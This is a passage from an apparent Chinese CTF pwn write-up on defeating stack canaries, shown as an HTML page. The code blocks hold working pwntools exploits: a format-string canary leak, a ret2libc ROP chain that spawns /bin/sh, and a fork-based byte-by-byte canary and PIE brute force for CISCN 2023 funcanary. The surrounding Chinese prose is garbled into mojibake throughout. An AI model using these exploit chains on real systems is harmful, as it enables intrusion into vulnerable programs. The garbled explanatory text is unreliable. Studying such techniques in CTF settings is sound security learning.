ä¸º</p>\n<pre><code>%11$p\n</code></pre>\n<p>æ¥ä¸‹æ¥å°±æ˜¯ï¼Œæ³„éœ² libc åŸºå€å’Œæ„é€  ROP é“¾</p>\n<p>æ³„éœ² puts å‡½æ•°åœ°å€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><!--æœ€åéœ€è¦è¿”å›åˆ°vulnï¼Œä¸èƒ½åœ¨è¿”å›mainã€‚ä¸éœ€è¦åå¤å»æ‰§è¡Œç¨‹åº-->\n<p>æ‰§è¡Œ systemï¼ˆ/bin/shï¼‰</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'gnome-terminal'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-c'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># p = remote('node4.buuoj.cn',26896)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># p.recv()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I'll give u some gift to help u!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># p.sendline(b'aaaaa')</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'%11$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># p.recvuntil(b'0x')\t</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400993</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pop_rsi_r15 <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400991</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ret <span class=\"token operator\">=</span><span class=\"token number\">0x00000000004005f9</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># main_addr = 0x04008DA</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>vuln_addr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"æ–¹æ³•ä¸‰-é€å­—èŠ‚çˆ†ç ´\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•ä¸‰-é€å­—èŠ‚çˆ†ç ´\">#</a> æ–¹æ³•ä¸‰  é€å­—èŠ‚çˆ†ç ´</h3>\n<h5 id=\"åŸç†-3\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†-3\">#</a> åŸç†</h5>\n<p>æ¯æ¬¡è¿›ç¨‹é‡å¯åçš„ Canary æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ Canary éƒ½æ˜¯ä¸€æ ·çš„ã€‚å¹¶ä¸” é€šè¿‡ fork å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ Canary ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› ä¸º fork å‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ã€‚<br>\nçˆ†ç ´æ¬¡æ•°ï¼šå¯¹äº 32 ä½ ELFï¼Œä½å­—èŠ‚å›ºå®šæ˜¯ \\x00ï¼Œæ‰€ä»¥åªéœ€è¦å¯¹ä¸‰ä¸ªå­—èŠ‚è¿›è¡Œçˆ†ç ´ã€‚çˆ†ç ´æ–¹å¼æ˜¯å…ˆåˆ©ç”¨æ ˆæº¢å‡ºè¦†å†™æ¬¡ä½å­—èŠ‚ï¼Œå¦‚æœå‡ºé”™çš„è¯ï¼Œä¼šæŠ¥é”™ï¼Œè·å¾—æ­£ç¡®çš„æ¬¡ä½å­—èŠ‚çš„è¯ï¼Œä¸ä¼šæŠ¥é”™ã€‚è·å–æ­£ç¡®çš„æ¬¡ä½å­—èŠ‚ä¹‹åï¼Œå†ä¾æ¬¡çˆ†ç ´æ¬¡é«˜å­—èŠ‚å’Œé«˜å­—èŠ‚ã€‚æ¯ä¸ªå­—èŠ‚çš„å¯èƒ½æ€§æ˜¯ 256ï¼Œå› æ­¤ 3 ä¸ªå­—èŠ‚çš„é€ä¸ªçˆ†ç ´æ€»æ¬¡æ•°æ˜¯ 256+256+256=768 æ¬¡</p>\n<h5 id=\"ciscn-2023-åˆèµ›funcanary\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2023-åˆèµ›funcanary\">#</a> [[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3VzZXIvbG9naW4/cmVkaXJlY3Q9L3Byb2JsZW0vNDA1Nw==\">CISCN 2023 åˆèµ›] funcanary</span></h5>\n<p>è¿™é¢˜æ—¢ç„¶æœ‰ pie çš„è¯ï¼Œé‚£å°±å…ˆä»‹ç»ä¸€ä¸‹ pie å§ã€‚</p>\n<h6 id=\"linux-ä¸‹çš„pieä¸aslr\"><a class=\"markdownIt-Anchor\" href=\"#linux-ä¸‹çš„pieä¸aslr\">#</a> <strong>Linux ä¸‹çš„ PIE ä¸ ASLR</strong></h6>\n<p>ç”±äºå—åˆ°å †æ ˆå’Œ libc åœ°å€å¯é¢„æµ‹çš„å›°æ‰°ï¼ŒASLR è¢«è®¾è®¡å‡ºæ¥å¹¶å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚å› ä¸º ASLR æŠ€æœ¯çš„å‡ºç°ï¼Œæ”»å‡»è€…åœ¨ ROP æˆ–è€…å‘è¿›ç¨‹ä¸­å†™æ•°æ®æ—¶ä¸å¾—ä¸å…ˆè¿›è¡Œ leakï¼Œæˆ–è€…å¹²è„†æ”¾å¼ƒå †æ ˆï¼Œè½¬å‘ bss æˆ–è€…å…¶ä»–åœ°å€å›ºå®šçš„å†…å­˜å—ã€‚</p>\n<p>è€Œ PIE (position-independent executable, åœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶) æŠ€æœ¯å°±æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µ.text, æ•°æ®æ®µ.*dataï¼Œ.bss ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ã€‚åŒ ASLR ä¸€æ ·ï¼Œåº”ç”¨äº† PIE çš„ç¨‹åºä¼šåœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½å˜æ¢åŠ è½½åŸºå€ï¼Œä»è€Œä½¿ä½äºç¨‹åºæœ¬èº«çš„ gadget ä¹Ÿå¤±æ•ˆã€‚</p>\n<p>ASLR åˆ™ä¸»è¦è´Ÿè´£å…¶ä»–å†…å­˜çš„åœ°å€éšæœºåŒ–ã€‚</p>\n<p><strong>PIE å¦‚ä½•ä½œç”¨äº ELF å¯æ‰§è¡Œæ–‡ä»¶</strong></p>\n<p>ELF ç¨‹åºè¿è¡Œçš„æ—¶å€™æ˜¯ cpu åœ¨ç¡¬ç›˜ä¸Šè°ƒå…¥åŠ è½½è¿›å†…å­˜çš„ï¼Œè¿™ä¸ªæ—¶å€™ç¨‹åºå°±æœ‰äº†å†…å­˜åœ°å€ç©ºé—´ã€‚</p>\n<pre><code>ELF file format:\n+---------------+\n|  File header  | # æ–‡ä»¶å¤´ä¿å­˜æ¯ä¸ªæ®µç±»å‹å’Œé•¿åº¦\n+---------------+ \n| .text section | # ä»£ç æ®µ å­˜æ”¾ä»£ç å’ŒæŒ‡ä»¤\n+---------------+\n| .data section | # æ•°æ®æ®µ \n+---------------+\n| .bss section  | # bssæ®µ å­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡,ä¸€èˆ¬å¯è¯»å†™\n+---------------+ # æ˜¯å­˜æ”¾shellcodeçš„å¥½åœ°æ–¹ã€‚\n|      ...      |\n+---------------+\n|  xxx section  |# è¿˜æœ‰å­—ç¬¦ä¸²æ®µã€ç¬¦å·è¡¨æ®µè¡Œå·è¡¨æ®µç­‰\n+---------------+\n</code></pre>\n<h6 id=\"æ£€æŸ¥\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥\">#</a> æ£€æŸ¥</h6>\n<p><img data-src=\"/img/canary/image-20230608174423723.png\" alt=\"image-20230608174423723\"></p>\n<p>ä¿æŠ¤å¼€çš„å¾ˆå…¨é¢å“ˆ</p>\n<h6 id=\"ida-3\"><a class=\"markdownIt-Anchor\" href=\"#ida-3\">#</a> ida</h6>\n<p><em>main</em></p>\n<p><img data-src=\"/img/canary/image-20230608174639174.png\" alt=\"image-20230608174639174\"></p>\n<p><em>canary</em></p>\n<p><img data-src=\"/img/canary/image-20230608174749268.png\" alt=\"image-20230608174749268\"></p>\n<p><em>backdoor</em></p>\n<p><img data-src=\"/img/canary/image-20230608174818492.png\" alt=\"image-20230608174818492\"></p>\n<p>è¿™æ˜¯ä¸€ä¸ªå­çº¿ç¨‹è¦†ç›– canaryï¼Œé¦–å…ˆ <code>fork</code>  ä¸€ä¸ªå­çº¿ç¨‹ï¼Œç„¶ååœ¨å­çº¿ç¨‹å†…è¿›è¡Œæ“ä½œï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œfork æ“ä½œä¸­å­çº¿ç¨‹å’Œä¸»çº¿ç¨‹ç”¨çš„æ˜¯ä¸€ä¸ª canary. å¹¶ä¸”ç¨‹åºä¸­è¿™ä¸€ä¸ªå¾ªç¯è¿˜ä¸ä¼šç»ˆæ­¢ï¼Œè¿™å°±è·Ÿä¾¿äºæˆ‘ä»¬å¯¹ canary çš„çˆ†ç ´ï¼Œé€šè¿‡ä¸‹é¢çš„æ±‡ç¼–ä¼šæ›´æ¸…æ™°çš„äº†è§£å­çº¿ç¨‹å’Œçˆ¶çº¿ç¨‹çš„å…³ç³»ã€‚</p>\n<p><img data-src=\"/img/canary/22.jpg\" alt=\"22\"></p>\n<p>æ€»ä¹‹ï¼Œé€šè¿‡ forkï¼Œæˆ‘ä»¬å¯ä»¥é€å­—èŠ‚çˆ†ç ´ canaryã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 ä½ç¨‹åºçˆ† 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çˆ† Pieã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span 